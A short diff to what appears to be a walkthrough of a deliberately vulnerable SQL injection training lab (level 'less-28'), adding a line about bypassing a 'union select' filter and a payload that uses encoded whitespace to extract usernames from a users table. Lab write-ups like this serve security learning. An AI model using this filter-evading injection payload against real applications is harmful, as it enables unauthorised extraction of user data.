@@ -272,6 +272,9 @@ less-28
 =======
 
 
-In this less we
+In this less we by pass ``union select`` filter
+ 
+ payload ``?id=') union(select (1),group_concat(username),('3') from%0Busers%0Bwhere '1``
 
+![image](https://user-images.githubusercontent.com/61080375/116455339-93908600-a87e-11eb-936f-5ba25fd98769.png)
 
